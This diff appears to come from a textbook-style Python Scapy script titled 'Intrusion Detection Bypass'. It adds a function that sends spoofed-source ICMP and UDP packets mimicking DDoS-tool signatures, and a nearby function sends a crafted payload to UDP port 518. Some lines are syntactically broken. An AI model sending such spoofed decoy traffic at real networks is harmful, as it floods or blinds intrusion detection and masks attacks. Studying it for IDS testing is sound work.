@@ -7,6 +7,14 @@ def banner():
 	print "[***]	Intrusion Detection Bypass p 166	[***]"
 
 def ddosTest(src, dst, iface, count):
+	pkt = IP(src=src, dst=dst) /ICMP(type=8, id=678) Raw(load='1234')
+	send(pkt, iface=iface, count=count)
+	pkt= IP(src=src, dst=dst) / ICMP(type=0) /Raw(load='AAAAAAAAAA')
+	send(pkt, iface=iface, count = count)
+	pkt= IP(src=src, dst=dst)/UDP(dport=31335)/Raw(load='PONG')
+	send(pkt,iface=iface, count=count)
+	pkt=IP(src=src, dst=dst)/ICMP(type=0, id=456)
+	send(pkt, iface=iface, count=count)
 
 def exploitTest(src, dst, iface, count):
 	pkt = IP(src=src, dst=dst)/ UDP(dport=518) Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
